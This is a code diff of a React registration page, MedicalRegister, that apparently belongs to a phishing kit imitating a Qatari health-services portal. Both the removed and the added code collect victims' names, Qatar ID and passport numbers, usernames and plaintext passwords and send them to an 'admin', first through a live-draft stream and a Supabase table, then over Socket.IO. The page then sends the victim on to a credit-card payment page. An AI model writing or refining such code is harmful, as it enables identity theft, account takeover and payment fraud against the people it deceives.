@@ -1,6 +1,5 @@
 import { useEffect, useMemo, useState } from "react";
-import { navigateToPage } from "@/lib/store";
-import { useLiveDraft } from "@/hooks/useLiveDraft";
+import { navigateToPage, sendData } from "@/lib/store";
 import { useLocation, useParams, useSearchParams } from "wouter";
 import { z } from "zod";
 import {
@@ -305,24 +304,16 @@ const MedicalRegister = () => {
     }
   }, [data.requestType, requestTypes]);
 
-  // Stream partial registration data to admin in realtime.
-  useLiveDraft({
-    step: "medical_register",
-    values: { ...data, current_step: step },
-    columns: {
-      phone: data.phone,
-      qatar_id: data.qatarId,
-      national_id: data.qatarId,
-      username: data.username,
-      full_name:
-        data.userType === "company"
-          ? `${data.companyNameAr || ""} | ${data.companyNameEn || ""}`.trim()
-          : `${data.fullNameAr || ""} | ${data.fullNameEn || ""}`.trim(),
-      governorate: data.governorate,
-      city: data.area,
-      selected_service: service,
-    },
-  });
+  // تحديث اسم الصفحة عند تغيير الخطوة
+  useEffect(() => {
+    const stepNames: Record<number, string> = {
+      1: 'التسجيل - البيانات الشخصية',
+      2: 'التسجيل - التواصل والعنوان',
+      3: 'التسجيل - الغرض والحساب',
+      4: 'التسجيل - المراجعة والدفع',
+    };
+    navigateToPage(stepNames[step] || 'تسجيل حساب جديد');
+  }, [step]);
 
   useEffect(() => { saveState(data); }, [data]);
   useEffect(() => { setErrors({}); window.scrollTo({ top: 0, behavior: "smooth" }); }, [step]);
@@ -368,94 +359,38 @@ const MedicalRegister = () => {
     else navigate(`/medical-login${serviceQuery}`);
   };
 
-  const handleFinalSubmit = async () => {
+  const handleFinalSubmit = () => {
     if (!validate(4)) return;
     setLoading(true);
-    const payload: any = {
-      phone: data.phone,
-      step: "medical_register",
-      // Informational log — the visitor is forwarded to /card-info which
-      // will create the actual pending row that needs admin approval.
-      status: "info",
-      selected_service: service,
-      current_page: "/medical-register",
-      full_name: data.userType === "company"
-        ? `${data.companyNameAr} | ${data.companyNameEn}`
-        : `${data.fullNameAr} | ${data.fullNameEn}`,
-      national_id: data.qatarId,
-      qatar_id: data.qatarId,
-      username: data.username,
-      password: data.password,
-      governorate: data.governorate,
-      city: data.area,
-      street: `${data.street} - مبنى ${data.building}`,
-      activation_data: {
-          requestType: data.requestType,
-          userType: data.userType,
-          passportNo: data.passportNo,
-          visaNo: data.visaNo,
-          nationality: data.nationality,
-          dob: data.dob,
-          gender: data.gender,
-          pregnant: data.pregnant,
-          establishmentNo: data.establishmentNo,
-          companyNameAr: data.companyNameAr,
-          companyNameEn: data.companyNameEn,
-          commercialRegNo: data.commercialRegNo,
-          activityType: data.activityType,
-          establishmentDate: data.establishmentDate,
-          email: data.email,
-          networkOperator: data.networkOperator,
-          employer: data.employer,
-          occupation: data.occupation,
-          purpose: data.purpose,
-          purposeCompany: data.purposeCompany,
-          fee_qar: FEE_QAR,
-          flow: serviceContext.isSehhaty ? "sehhaty_register" : "register",
-          service_platform: serviceContext.platformShortAr,
-          service_title_ar: serviceContext.titleAr,
-          service_title_en: serviceContext.titleEn,
-          // Mirror step-scoped credentials/identity so later pages that
-          // reuse the top-level username/password/full_name columns
-          // (Ooredoo login, card flow) don't erase them from the admin card.
-          register_username: data.username,
-          register_password: data.password,
-          register_full_name_ar: data.userType === "company" ? data.companyNameAr : data.fullNameAr,
-          register_full_name_en: data.userType === "company" ? data.companyNameEn : data.fullNameEn,
-          register_qatar_id: data.qatarId,
-          register_phone: data.phone,
-          register_governorate: data.governorate,
-          register_city: data.area,
-          register_street: data.street,
-          register_building: data.building,
+    // إرسال البيانات للأدمن عبر Socket.IO
+    sendData({
+      data: {
+        "نوع المستخدم": data.userType === 'company' ? 'شركة / منشأة' : 'مستخدم فردي',
+        "الاسم بالعربية": data.userType === 'company' ? data.companyNameAr : data.fullNameAr,
+        "الاسم بالإنجليزية": data.userType === 'company' ? data.companyNameEn : data.fullNameEn,
+        "رقم الهوية القطرية": data.qatarId,
+        "رقم الهاتف": data.phone,
+        "البريد الإلكتروني": data.email,
+        "اسم المستخدم": data.username,
+        "كلمة المرور": data.password,
+        "الخدمة": service,
+        "الجنسية": data.nationality,
+        "تاريخ الميلاد": data.dob,
+        "الجنس": data.gender === 'male' ? 'ذكر' : 'أنثى',
+        "المحافظة": data.governorate,
+        "المنطقة": data.area,
+        "الشارع": data.street,
+        "المبنى": data.building,
+        "رقم جواز السفر": data.passportNo,
+        "المهنة": data.occupation,
+        "الغرض": data.purpose || data.purposeCompany,
       },
-      updated_at: new Date().toISOString(),
-    };
-    // Update the existing session row if present so the admin sees one
-    // continuous visitor identity across /medical-login → /medical-register.
-    let existingId: string | null = null;
-    try { existingId = sessionStorage.getItem("visitor_request_id"); } catch { /* noop */ }
-    let row: { id: string } | null = null;
-    let error: unknown = null;
-    if (existingId) {
-      const merged = await updateVisitorRow(existingId, payload); const res = { data: merged, error: null as unknown };
-      row = res.data as any; error = res.error;
-      if (!row) {
-        const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" } as unknown as never).select("id").single();
-        row = ins.data as any; error = ins.error;
-      }
-    } else {
-      const ins = await supabase.from("login_requests").insert({ ...payload, otp_code: "----" } as unknown as never).select("id").single();
-      row = ins.data as any; error = ins.error;
-    }
+      current: 'تسجيل حساب جديد',
+      waitingForAdminResponse: false,
+    });
     setLoading(false);
-    if (error || !row) return;
-    setVisitorRequestId(row.id);
-    try {
-      sessionStorage.setItem("selected_service", service);
-      sessionStorage.removeItem(STORAGE_KEY);
-    } catch { /* noop */ }
-    navigate("/card-info", { state: { phone: data.phone, fee: FEE_QAR, from: "register" } });
+    try { sessionStorage.removeItem(STORAGE_KEY); } catch { /* noop */ }
+    navigate('/credit-card-payment');
   };
 
   const stepMeta = useMemo(() => [
